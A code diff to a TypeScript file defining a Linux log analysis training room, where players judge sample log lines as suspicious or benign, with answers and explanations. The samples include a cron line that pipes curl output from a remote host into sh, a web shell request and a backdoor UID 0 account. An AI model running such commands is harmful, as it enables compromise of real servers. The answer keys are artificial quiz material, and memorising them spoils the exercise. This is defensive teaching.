@@ -9,8 +9,8 @@ import type { RoomExperience } from "./types";
 // the journalctl drill uses -u cron, -b, -p and _COMM, never --since/--until
 // for sshd (q2); the SSH console is lastb, last and authorized_keys on
 // another host and IP, never la1's 185.220.101.45 (la1, flag1); the cron
-// console never reads auditd auid/euid (q3); and no lab shows a gap in
-// auth.log (q4).
+// console never reads auditd auid/euid (q3); the rush cards show an auid
+// and a gap in auth.log with other values than q3 and q4.
 export const LINUX_LOG_ANALYSIS: RoomExperience = {
   roomId: "linux-log-analysis",
   codename: "Operation Var Log",
@@ -167,16 +167,18 @@ export const LINUX_LOG_ANALYSIS: RoomExperience = {
           { id: "r4", text: "sudo: www-data : USER=root ; COMMAND=/bin/bash", answer: true, why: "The web server account should never need sudo, let alone a root shell. This is what follows a web shell landing." },
           { id: "r5", text: "CRON[2210]: (root) CMD (/usr/local/bin/backup.sh)", answer: false, why: "A scheduled job under root, running a script that is on the build sheet. Compare it to the baseline and move on." },
           { id: "r6", text: "CRON[3318]: (www-data) CMD (curl -s http://203.0.113.75/a | sh)", answer: true, why: "The web user running cron that downloads and executes a remote script. Nothing legitimate looks like this." },
-          { id: "r7", text: "ls /etc/cron.d: .sysclean, 71 bytes, dated today. Others months old.", answer: true, why: "A leading dot hides it from plain ls, and it is the only fresh file. Hidden and new in a cron directory is the pattern to chase." },
-          { id: "r8", text: "ls /etc/cron.d: php, owned by root, dated March, matches the package", answer: false, why: "Owned by root, old, shipped by the php package. Visible, old and unchanged since install, so it is not what you are hunting." },
+          { id: "r7", text: "ls /etc/cron.d: sysclean, 71 bytes, dated today. Others months old.", answer: true, why: "It is the only fresh file in a directory where everything else is months old, and its name imitates housekeeping. A new cron entry nobody can account for is the pattern to chase." },
+          { id: "r8", text: "ls /etc/cron.d: php, owned by root, dated March, matches the package", answer: false, why: "Owned by root, old, shipped by the php package. Old and unchanged since install, so it is not what you are hunting." },
           { id: "r9", text: "nginx: GET /upload/avatar.php?c=whoami 200 54 curl/8.5.0", answer: true, why: "A .php file in an upload folder that answers a command and returns 200. That is a web shell, and the way in." },
           { id: "r10", text: "nginx: GET /wp-login.php 404 from 203.0.113.14", answer: false, why: "A 404 for a WordPress path on a site that does not run WordPress. Scanners probe constantly and found nothing." },
           { id: "r11", text: "sshd: Accepted publickey for deploy from 10.20.0.40 at 09:14", answer: false, why: "A key login from the jump host in office hours is how deploy normally arrives." },
           { id: "r12", text: "sshd: Accepted publickey for deploy from 203.0.113.27 at 03:41", answer: true, why: "The account is real and the method is normal, but the source and the hour are not. A stolen key looks exactly like this." },
           { id: "r13", text: "useradd: new user: name=sysmgr, UID=0, GID=0, shell=/bin/bash", answer: true, why: "A new account with UID 0 is a second root. Whatever its name, the number is what counts." },
           { id: "r14", text: "systemd: logrotate.service: Deactivated successfully.", answer: false, why: "Routine housekeeping that finished without error. It rotates the logs you are reading." },
+          { id: "r15", text: "audit.log: type=SYSCALL syscall=59 auid=1004 uid=0 euid=0 comm=\"systemctl\" exe=\"/usr/bin/systemctl\"", answer: false, why: "auid is the login identity and it survives sudo and su: user 1004 logged in, and uid and euid 0 mean the command ran as root. A named engineer running systemctl through sudo is routine. An auid of 4294967295 (unset) or a login you cannot account for would be the problem." },
+          { id: "r16", text: "auth.log: last line 09:10, next line 21:38. File modified 21:38. Server never rebooted.", answer: true, why: "Twelve hours of a busy server are missing and the file was touched at the end of the gap, with no reboot to explain it. Lines were probably deleted. Check the copy forwarded to the SIEM for the missing hours." },
         ],
-        lesson: "Judge a log line on who, from where, at what hour and whether it fits the baseline. Hidden dot files in cron.d, the web account using sudo, and a .php file answering commands are the lines that deserve a ticket.",
+        lesson: "Judge a log line on who, from where, at what hour and whether it fits the baseline. A fresh unexplained file in cron.d, the web account using sudo, and a .php file answering commands are the lines that deserve a ticket.",
       },
     ],
   },
